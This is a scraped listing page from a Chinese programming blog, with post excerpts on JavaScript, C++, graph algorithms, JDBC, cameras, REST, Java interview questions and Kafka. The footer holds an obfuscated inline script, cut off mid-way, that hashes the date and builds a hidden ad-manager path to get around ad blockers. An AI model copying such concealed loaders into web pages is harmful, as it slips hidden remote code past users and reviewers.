es6已经帮我们很好的解决了此类问题。
es6针对对象增加了3个新方法（数组也有）：
（1）、Object.keys：返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历属性的键名
（2）、Object.values：返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历属性的键值
（3）、Object.entries：返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历属性的键值对
由此，我们可以通过其中任意一个方法，得到返回的数组，判断数组长度是否大于0，来判断对象是否为空。
举个栗子：
const obj = { foo: 'bar', baz: 42 } console.log(Object.keys(obj)); // ["foo", "baz"] console.log(Object.values(obj)); // ["bar", 42] console.log(Object.entries(obj)); // [["foo", "bar"], ["baz", 42]] // 打印返回值的长度 console.log(Object.keys(obj).length); // 2 const obj2 = {}; console.log(Object.keys(obj2)); // [] // 打印空对象的长度 console.log(Object.keys(obj2).length); // 0 这样我们就可以很简单直观的判断出对象是否为空，并且可以通过这三个方法，拿到想要的数据（键名、键值、键值对）
那么既然得到了返回值数组，我们也可以很简单的判断对象中是否包含某个我们已知的属性名
console.log(Object.keys(obj).indexOf('baz')); // 1 console.log(Object.keys(obj).indexOf('ad')); // -1 indexOf可以判断数组是否包含某个值，返回该值所对应的下标，对于不存在的值，返回 -1
这样我们就能判断对象是否包含某个属性名了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d65fb7e9a21d5926b2b60bfb9a2996cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/855eda4e3f5ed21e903cc1d68818dc1a/" rel="bookmark">
			算法 动态规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++ 环境设置
本地环境设置
如果您想要设置 C++ 语言环境，您需要确保电脑上有以下两款可用的软件，文本编辑器和 C++ 编译器。
文本编辑器
这将用于输入您的程序。文本编辑器包括 Windows Notepad、OS Edit command、Brief、Epsilon、EMACS 和 vim/vi。
文本编辑器的名称和版本在不同的操作系统上可能会有所不同。例如，Notepad 通常用于 Windows 操作系统上，vim/vi 可用于 Windows 和 Linux/UNIX 操作系统上。
通过编辑器创建的文件通常称为源文件，源文件包含程序源代码。C++ 程序的源文件通常使用扩展名 .cpp、.cp 或 .c。
在开始编程之前，请确保您有一个文本编辑器，且有足够的经验来编写一个计算机程序，然后把它保存在一个文件中，编译并执行它。
C++ 编译器
写在源文件中的源代码是人类可读的源。它需要"编译"，转为机器语言，这样 CPU 可以按给定指令执行程序。
C++ 编译器用于把源代码编译成最终的可执行程序。
大多数的 C++ 编译器并不在乎源文件的扩展名，但是如果您未指定扩展名，则默认使用 .cpp。
最常用的免费可用的编译器是 GNU 的 C/C++ 编译器，如果您使用的是 HP 或 Solaris，则可以使用各自操作系统上的编译器。
以下部分将指导您如何在不同的操作系统上安装 GNU 的 C/C++ 编译器。这里同时提到 C/C++，主要是因为 GNU 的 gcc 编译器适合于 C 和 C++ 编程语言。
转载 动态规划的图像压缩
https://www.cnblogs.com/Pinging/p/7899156.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88d04652ab5205714c5f2ab2e99d6523/" rel="bookmark">
			图论总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图论的东西还真挺多的，马上联赛了，的确该写一写总结了。下文主要介绍了最短路，生成树和网络流，给出了一些图论比较好的题。对于一些比较偏的知识点，我太菜了不会啊。
一.最短路算法 1. Dijkstra
适用范围：无负权边
朴素的dijkstra是 O ( n 2 ) O(n^2) O(n2)，堆优化的dijkstra可以做到 O ( ( n + m ) l o g m ) O((n+m)logm) O((n+m)logm)，如果使用set优化，时间复杂度可以更加稳定，但是一般数据可能比堆优化慢。使用斐波那契堆可以优化到 O ( n l o g n + m ) O(nlogn+m) O(nlogn+m)，但是编程复杂度会更高。
typedef long long ll; struct node{int u,v,w;}e[N&lt;&lt;1|1]; int f[N],nxp[N&lt;&lt;1|1],cnt=0; inline void add(const int&amp;u,const int&amp;v,const int&amp;w){ e[++cnt]=(node){u,v,w};nxp[cnt]=f[u];f[u]=cnt; e[++cnt]=(node){v,u,w};nxp[cnt]=f[v];f[v]=cnt;	} typedef pair&lt;ll,int&gt;T; ll d[N]; bool vis[N]; priority_queue&lt;T,vector&lt;T&gt;,greater&lt;T&gt; &gt;q; void dij(){ memset(d,127/3,sizeof(ll)*(n+5));d[1]=0; q.push(mp(0,1)); while(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88d04652ab5205714c5f2ab2e99d6523/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bba0b613787e49d97b809648116a6836/" rel="bookmark">
			JDBC基本用法与HikariCP连接池
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 JDBC JDBC, Java Database Connecive, Java 数据库连接，是一组专门负责连接并操作数据库的标准，在整个JDBC 中实际上大量的提供的是接口。针对于各个不同的数据库生产商 ，只要想使用JAVA 进行数据库的开发，则对这些标准有所支持。
使用JDBC我们可以在java中使用统一的API来访问数据库，进行CURD操作，而不用去关系底层是oracle、DB2、SQLServer、还是MYSQL。
使用JDBC编程的基本步骤如下(以MySql为例)：
前置条件：
安装mysql
在maven依赖中引入mysql驱动
&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.25&lt;/version&gt; &lt;/dependency&gt; 在进行JDBC 操作的时候可以按照以下的步骤完成：
1、加载数据库驱动程序，加载的时候需要将驱动程序配置到classpath之中
Class.forName("com.mysql.jdbc.Driver"); 2、连接数据库，通过Connection 接口和 DriverManager 类完成
String url = "jdbc:mysql://localhost:3306/web_application?useSSL=false&amp;useUnicode=true&amp;characterEncoding=UTF-8"; Connection connection = DriverManager.getConnection(url,"root","password"); 3、操作数据库，通过Statement、PreparedStatement、ResultSet 三个接口完成
Statement statement = connection.createStatement(); String createUsersSql = "create table " + User.$.tableName + "(" + User.$.id + " int(32) primary key not null auto_increment," + User.$.userName + " varchar(32) not null,"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bba0b613787e49d97b809648116a6836/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93c9b58e41e86b43a6b437f907351484/" rel="bookmark">
			国内arxiv镜像网站：让你快速下载论文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cornell University 建立了一个论文数据库： https://arxiv.org/
目前，国外计算机领域的论文基本会第一时间上传至该网站，但是由于该网站在国外，国内在该网站下载论文时会显得比较慢。因此，国内的开发人员建立了一个国内镜像网站，通过该网站，我们可以快速有效的下载我们所需要的文章。
该镜像网站为：http://xxx.itp.ac.cn
下面，我为大家演示一遍如何操作：
首先，你需要知道你想要下载的论文id号。比如CVPR就会在官网显示最近接受的论文id.
比如，在这里我要下载的论文id为 1504.08083
那么，我们直接在浏览器中搜索：http://xxx.itp.ac.cn/pdf/1504.08083.pdf
点击下载，即可！这种方法比在arxiv官网中直接下载速度会快很多
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/764d1e046b3180aaabe06587db4978bf/" rel="bookmark">
			Intel Realsense D435 如何获取摄像头的内参？get_profile（） video_stream_profile（） get_intrinsics（）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# 获取摄像头的内参是为了将像素坐标转化成实际坐标 import pyrealsense2 as rs pipeline = rs.pipeline() config = rs.config() config.enable_stream(rs.stream.depth, 640, 480, rs.format.z16, 30) config.enable_stream(rs.stream.color, 640, 480, rs.format.bgr8, 30) profile = pipeline.start(config) frames = pipeline.wait_for_frames() depth = frames.get_depth_frame() color = frames.get_color_frame() # 获取内参 depth_profile = depth.get_profile() print(depth_profile) # &lt;pyrealsense2.video_stream_profile: 1(0) 640x480 @ 30fps 1&gt; print(type(depth_profile)) # &lt;class 'pyrealsense2.pyrealsense2.stream_profile'&gt; print(depth_profile.fps()) # 30 print(depth_profile.stream_index()) # 0 print(depth_profile.stream_name()) # Depth print(depth_profile.stream_type()) # stream.depth print('', depth_profile.unique_id) # &lt;bound method PyCapsule.unique_id of &lt;pyrealsense2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/764d1e046b3180aaabe06587db4978bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b27c7110d6298f5a36ec95d8067339fa/" rel="bookmark">
			相机相关知识及视场角的计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、视场角计算
1、 原理
2、ccd靶面规格尺寸和相机视场角的计算
二、焦距和变焦倍率的关系
三、举例说明
1、NTSC（National Televison System Committee）制式
2、PAL（Phase Alternative Line）制式
参考文献
一、视场角计算 1、 原理 视场和焦距的计算 视场系指被摄取物体的大小，视场的大小是以镜头至被摄取物体距离，镜头焦头及所要求的成像大小确定的
镜头的焦距，视场大小及镜头到被摄取物体的距离的计算如下； f=wL/W f=hL/H f：镜头焦距 w：图象的宽度（被摄物体在ccd靶面上成象宽度） W：被摄物体宽度 L：被摄物体至镜头的距离 h：图象高度（被摄物体在ccd靶面上成像高度）视场（摄取场景）高度 H：被摄物体的高度 2、ccd靶面规格尺寸和相机视场角的计算 规格 W H （单位mm） 1/4" 3.2 2.4 1/3" 4.8 3.6 1/2" 6.4 4.8 2/3" 8.8 6.6 1" 12.8 9.6 lin靶面尺寸为宽12.7mmx高9.6mm,对角线16mm 2/3in靶面尺寸为宽8.8mmx高6.6mm,对角线11mm 1/2in靶面尺寸为宽6.4mmx高4.8mm,对角线8mm 1/3in靶面尺寸为宽4.8mmx高3.6mm,对角线6mm 1/4in靶面尺寸为宽3.2mmx高2.4mm,对角线4mm 摄像机CCD标准：1英寸CCD长宽为12.8×9.6mm，对角线长度为16mm
1/2.8CCD的对角线长度=16÷2.8=5.71mm，边长按4：3来计算为：4.59mm×3.42mm。
水平视场角=2arctg（靶面宽/（2*焦距）） 垂直视场角=2arctg（靶面高/（2*焦距）） 二、焦距和变焦倍率的关系 （1）镜头成像清晰必须满足透镜成像公式：1/u+1/v=1/f，这里，u是物距，v是像距，f是焦距
（2）在满足成像清晰的前提下，放大率等于像距比物距，就是：k=v/u。也就是说：物距越小（相机越靠近物体）、像距越大（镜头相对焦平面越往前移），放大率越高。同样物距，焦距越长则像距越大、放大率越高
（3）光学变焦倍数是指镜头的最长焦段除以最广角段，比如17-200mm的镜头。就是200除以17，约12倍变焦。80-300mm就是300除以80，约4倍变焦
（4）数码变焦利用软件对已有像素周边的色彩进行判断，并根据周边的色彩情况插入经特殊算法加入的像素。通过相机内的处理器，把图片内的每个像素面积增大，从而达到放大目的。程序在相机内进行，把原来CCD影像感应器上的一部份像素使用"插值"处理手段做放大，将CCD影像感应器上的像素用插值算法将画面放大到整个画面。实际上数码变焦并没有改变镜头的焦距。【摘自百度百科】
（5）同一个相机，CCD靶面不变，当变倍越大时焦距越长，视场角变小，成像目标变大
（6）同一相机，镜头不变，CCD靶面越小，视场角越小，但拍摄画面中的物体看起来要大一点
三、举例说明 海康DS-2DM1-714：
1、NTSC（National Televison System Committee）制式 NTSC制式，又简称为N制，是1952年12月由美国国家电视标准委员会（National Television System Committee，缩写为NTSC）制定的彩色电视广播标准，属于同时制，帧率为每秒29.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b27c7110d6298f5a36ec95d8067339fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb27cbe83d94d456fdbb0261fcc6faa0/" rel="bookmark">
			c语言中栈和数组buf的生长方向
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于c语言中，栈是向上还是向下生长，一般由操作系统决定。一般是栈是向下生长，因为一旦是向下生长，最高地址确定之后，就不会发生溢出。但是不管是栈是向下生长还是向上生长，buf的生长的方向都是向上的，buf是数组首元素的地址，其是一个常量，是不能改变的，即不能执行buf++，但是可以执行buf+i (前提是buf是一个数组)。具体示意图如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/655e7eec1a63258da6853a3bda6d8765/" rel="bookmark">
			REST无状态的理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转至http://lelglin.iteye.com/blog/1852092
Representational State Transfer的缩写。我对这个词组的翻译是"表现层状态转化"。
降低开发的复杂性，提高系统的可伸缩性
资源表现层状态转化 无状态的好处：
如果一台服务器宕机,无状态请求可以透明地交由另一台可用Server来处理,而有状态的请求则会因为存储请求状态信息的Server宕机而承担状态丢失的风险。并且对于无状态的请求，服务端可以对用户的请求进行负载均衡，而有状态的请求就只能交由保存着该用户状态的某个server进行处理，虽然共享session可解决负载均衡但仍要承担保存session的server出现宕机的风险。
资源
REST的名称"表现层状态转化"中，省略了主语。"表现层"其实指的是"资源"（Resources）的"表现层"。所谓"资源"，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。你可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。
表现层（Representation）
URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的".html"后缀名是不必要的，因为这个后缀名表示格式，属于"表现层"范畴，而URI应该只代表"资源"的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对"表现层"的描述。
状态转化（State Transfer）
互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生"状态转化"（State Transfer）。而这种转化是建立在表现层之上的，所以就是"表现层状态转化"。
就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。
几种误区
最常见的一种设计错误，就是URI包含动词－－》 /posts/show/1，正确的写法应该是/posts/1，然后用GET方法表示show。
资源不能是动词，但是可以是一种服务
POST /accounts/1/transfer/500/to/2 －－》
POST /transaction HTTP/1.1
from=1&amp;to=2&amp;amount=500.00
为什么在请求中传递SessionID被普遍认为是unRESTful的，而将用户的credentials包含在每个请求里又是一种非常RESTful的做法
无状态指的是任意一个Web请求必须完全与其他请求隔离，当请求端提出请求时，请求本身包含了相应端为相应这一请求所需的全部信息。
RESTful架构对于state的两个不同的解释: 应用状态(Application State)和资源状态(Resource State)。
应用状态：指的是与某一特定请求相关的状态信息资源状态：则反映了某一存储在服务器端资源在某一时刻的特定状态，该状态不会因为用户请求而改变，任何用户在同一时刻对该资源的请求都会获得这一状态的表现（Representation）。 RESTful架构要求服务器端不保有任何与特定HTTP请求相关的资源，所以应用状态必须由请求方在请求过程中提供。
在Session ID可以被认为是一个用来标识某一会话状态的Key，将其传递给服务器端意味着这样一个请求：“请帮我取出这个状态信息”，也就是说这个请求假设响应方保有着状态信息。由于与某一特定请求相关的状态属于应用状态，而RESTful架构要求任何此类状态由请求方负责提供，所以传递Session ID被认为是unRESTful的做法。反过来，user credential作为一种应用状态，是被期望由请求方提供的，所以在请求中传递user credentials（姑且忽略安全性问题）是符合RESTful架构规范的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01978e9d4197e6c4942f2e52ff899fa4/" rel="bookmark">
			根目录都有node_modules，idea项目怎么没加载出来node_modules的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在idea控制台命令cd 要操作的vue项目
2. 然后初始化 init
3. install …执行安装的时候发现项目没加载出来node_modules，刷新了好几遍，项目的根目录文件夹已经有了node_modules模块
但是控制台已经显示成功了，纠结了好久(百度出来的情况给我的不一样)
解决方案:
把初始化哪个packge.json的json文件删除后这个模块就刷新出来了，冲突？???
目前只能这样解释
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/416c18a049e324be4c629c60f066caa7/" rel="bookmark">
			Java面试题（四）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、数组有没有length()这个方法? String有没有length()这个方法？
数组没有length()这个方法，有length的属性。String有有length()这个方法。
2、构造器Constructor是否可被override?
构造器Constructor不能被继承，因此不能重写Overriding，但可以被重载Overloading。
3、try {}里有一个return语句，那么紧跟在这个try后的finally {}里的code会不会被执行，什么时候被执行，在return前还是后?
会执行，在return前执行。一般情况下，finally里面的代码一定执行。
4、当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递? 是值传递。Java 编程语言只有值传递参数，当一个对象实例作为一个参数被传递到方法中时，参数的值就是对该对象的引用。对象的内容可以在被调用的方法中改变，但对象的引用是永远不会改变的。
5、当一个线程进入一个对象的一个synchronized方法后，其它线程是否可进入此对象的其它方法?
不能，一个对象的一个synchronized方法只能由一个线程访问。
6、编程题: 写一个Singleton出来。
Singleton模式主要作用是保证在Java应用程序中，一个类Class只有一个实例存在。
第一种形式：定义一个类，它的构造函数为private的，它有一个static的private的该类变量，在类初始化时实例化，通过一个public的getInstance方法获取对它的引用,继而调用其中的方法。
class Singleton{ private Singleton() { } private static Singleton instance = null; public static Singleton getInstance() { if(instance == null) { synchronized (Singleton.class){ instance = new Singleton(); } } return instance; } } 第二种形式：
public class Singleton { private static Singleton instance = null; public static synchronized Singleton getInstance() { //这个方法比上面有所改进，不用每次都进行生成对象，只是第一次　//使用时生成实例，提高了效率！ If (instance==null){ instance＝new Singleton(); } return instance; } } 7、垃圾回收的优点和原理，并考虑2种回收机制。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/416c18a049e324be4c629c60f066caa7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92f91d2dac489919d7952b3fd4f44b97/" rel="bookmark">
			Redis消息队列和KafKa优劣对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Redis作为消息队列升级为KafKa记录 项目当中运营人员发送指定匹配用户(最高用户量几十万的级别)特定的消息,所以这块是确确实实需要使用专业级别的消息队列中间件的,但是可能由于当时开发的各种历史原因导致使用了Redis的队列结构来作为消息队里lpush,blpop等命令,项目开发进展到现在,用户量不断增大,包括不同的消息继承进来,包括举报反馈,小纸条(用户间消息发送),活动奖励通知,等等一些不同的消息进来以后,Redis可能会变得不那么可靠.
Redis作为消息队列 Redis的pub-sub模式非常像西式快餐一样,快产快消,全都是因为Redis是使用内存来做存取,所有你生产的消息立马会被消费者一次性全部处理掉,并且没有留下任何痕迹, 同时因为内存总是宝贵的,所以内存上会有限制,当生产者以及消费者上来的时候也会对redis的效率,还有Redis在处理发布和消费big size(10K+的文件)的数据的时候会表现出无法忍受的缓慢
如果有以下场景可以考虑使用Redis作为消息队列
如果你的需求是快产快消的即时消费场景,并且生产的消息立即被消费者消费掉如果速度是你十分看重的,比如慢了一秒好几千万这种如果允许出现消息丢失的场景如果你不需要系统保存你发送过的消息,做到来无影去无踪需要处理的数据量并不是那么巨大 KafKa作为消息队列 KafKa的设计精妙,支持分布式,高可用的部署,并且对一个大的队列采用分成多个Partition(分区),来提高消息入队的吞吐量,分而治之的思想. 并且消费的时候支持group的概念,能够支持多个客户端消费同个队列,并且一个group中可以增加Consumer的数量来扩展消费的处理量.
KafKa不受生产者数量的影响,因为吞吐量足够支撑,即使在廉价的单机服务器上也可以有10万每秒的消息传输量,并且消费者是想什么时候消费都可以,消息它就在那里,十分灵活,不用担心来无影去无踪的恐慌.能把消息持久化,并以一定的策略(例如一定时间内删除,或者到达多大容量的时候清空)
当有一下场景的时候你可以考虑使用KafKa作为消息队列
如果你想要稳定的消息队列如果你想要你发送过的消息可以保留一定的时间,并不是无迹可寻的时候如果你无法忍受数据的丢失如果速度不需要那么的快如果需要处理数据量巨大的时候 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc2f2636d92ff03701bc086e1d99dcfc/" rel="bookmark">
			android studio: Could not find any version that matches com.android.support:appcompat-v7:29.&#43;.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
今天新安装android studio3.1.2，之后创建新的工程，但是出现了一些错误提示，提示如下：
Unable to resolve dependency for ':app@debug/compileClasspath': Could not find any version that matches com.android.support:appcompat-v7:29.+.
分析发现，就是版本不匹配的问题。
解决：
将build.gradle(Module:app)内容做一定修改后就好了
修改后重新 sync即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e443c213047fe92e87de8eef25c3dcb/" rel="bookmark">
			瓶子酱ubuntu16.04日记01——搞丢~/.bashrc文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境ubuntu16.04
问题：
使用vim编辑文件后，直接关闭终端，～/.bashrc文件丢失，再打开～/.bashrc文件，显示空白
现象：
在UBUNTU中使用vim（vi）文件编辑器一定要小心，不推荐（不允许之间关闭终端），每一次退出的时候都必须保存后退出，不然文件会丢失。
解决方案：
用系统中存储的.bashrc备份文件恢复到~/目录下，执行：
cp /etc/skel/.bashrc ~/ 其中，/etc/skel是Ubuntu的各种初始配置文件的存放目录
ps:
vim编辑器，几个常用的指令：
i ：变成可插入模式——&gt;Esc退出——&gt;:wq保存并退出
或（大写）ZZ保存并退出
[转载：
版权声明：本文为CSDN博主「yucicheung」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/yucicheung/article/details/79334998]
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/457/">«</a>
	<span class="pagination__item pagination__item--current">458/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/459/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(